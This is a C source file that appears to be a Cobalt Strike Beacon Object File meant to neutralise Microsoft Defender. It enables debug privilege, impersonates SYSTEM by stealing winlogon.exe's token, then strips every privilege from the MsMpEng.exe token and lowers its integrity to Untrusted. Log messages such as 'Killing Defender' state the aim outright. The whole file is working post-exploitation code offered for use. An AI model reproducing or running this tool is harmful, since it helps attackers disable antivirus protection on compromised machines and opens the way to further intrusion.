#include <windows.h>
#include <winternl.h>
#include <tchar.h>
#include <stdio.h>
//#include <fcntl.h>
#include <tlhelp32.h>
#include "beacon.h"
#include "kdbof_def.h"
//#include <conio.h>



void EnableDebugPrivilege()
{
    HANDLE hToken;
    LUID sedebugnameValue;
    TOKEN_PRIVILEGES tkp;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken Failed.");
    }
    if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &sedebugnameValue))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] LookupPrivilegeValue.");
        KERNEL32$CloseHandle(hToken);
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] AdjustTokenPrivileges Failed.");
        KERNEL32$CloseHandle(hToken);
    }
}

int getpid(const char * procname) { //LPCWSTR

    DWORD procPID = 0;
    //size_t sclength = 0;
    //VirtualAlloc(0, sclength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    char * processName;
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    //sclength = 0;
    //VirtualAlloc(0, sclength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // replace this with Ntquerysystemapi
    HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, procPID);
    if (KERNEL32$Process32First(snapshot, &processEntry))
    {
        while (MSVCRT$_stricmp(processName, procname) != 0) //(processName, procname) != 0) //(MSVCRT$_wcsicmp
        {
            KERNEL32$Process32Next(snapshot, &processEntry);
            processName = processEntry.szExeFile;
            procPID = processEntry.th32ProcessID;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Got %s PID: %d\n", procname, procPID);
    }
    return procPID;

}

BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{

    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$LookupPrivilegeValueA(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValue error");//: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
    else
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

    // Enable the privilege or disable all privileges.

    if (!ADVAPI32$AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges Error: 0x%lx\n", KERNEL32$GetLastError());
        return FALSE;
    }
    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        BeaconPrintf(CALLBACK_ERROR, "The token does not have the specified privilege. \n");
        return FALSE;
    }
    
    return TRUE;
}

void go(int argc, char** argv)
{
    LUID sedebugnameValue;
    EnableDebugPrivilege();
    //Get pid for winlogon process
    const char * procname = "winlogon.exe";
    int pid = getpid(procname);
    //Open handle to winlogon
    HANDLE phandle = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    //Open winlogon process token
    HANDLE ptoken;
    ADVAPI32$OpenProcessToken(phandle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &ptoken);
    //Impersonate System via winlogon's process token
    if (ADVAPI32$ImpersonateLoggedOnUser(ptoken)) {

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Impersonated System!\n");
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to impersonate System...\n");
    }
    KERNEL32$CloseHandle(phandle);
    KERNEL32$CloseHandle(ptoken);

    const char* procname2 = "MsMpEng.exe";
    pid = getpid(procname2);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Killing Defender...\n");

    phandle = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);

    if (phandle != INVALID_HANDLE_VALUE) {

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Opened Target Handle\n");
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to open Process Handle\n");
    }
    BOOL token = ADVAPI32$OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);
    if (token) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Opened Target Token Handle\n");
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to open Target Token Handle\n");
    }
    ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &sedebugnameValue);

    TOKEN_PRIVILEGES tkp;

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!ADVAPI32$AdjustTokenPrivileges(ptoken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {

        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to Adjust Token's Privileges\n");
    }

    // Remove all privileges
    SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);
    SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);
    SetPrivilege(ptoken, SE_TCB_NAME, TRUE);
    SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);
    SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);
    SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);
    SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);
    SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);
    SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
    SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);
    SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);
    SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);
    SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);
    SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Removed All Privileges\n");

    DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;

    SID integrityLevelSid;
    integrityLevelSid.Revision = SID_REVISION;
    integrityLevelSid.SubAuthorityCount = 1;
    integrityLevelSid.IdentifierAuthority.Value[5] = 16;
    integrityLevelSid.SubAuthority[0] = integrityLevel;

    TOKEN_MANDATORY_LABEL tokenIntegrityLevel;
    tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
    tokenIntegrityLevel.Label.Sid = &integrityLevelSid;
    ADVAPI32$GetLengthSid(&integrityLevelSid);
    if (!ADVAPI32$SetTokenInformation(
        ptoken,
        TokenIntegrityLevel,
        &tokenIntegrityLevel,
        sizeof(TOKEN_MANDATORY_LABEL) + ADVAPI32$GetLengthSid(&integrityLevelSid)))
    {
        BeaconPrintf(CALLBACK_ERROR, "SetTokenInformation Error: 0x%lx\n", KERNEL32$GetLastError());
    }
    else {

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Token Integrity set to Untrusted\n");
    }

    KERNEL32$CloseHandle(ptoken);
    KERNEL32$CloseHandle(phandle);

}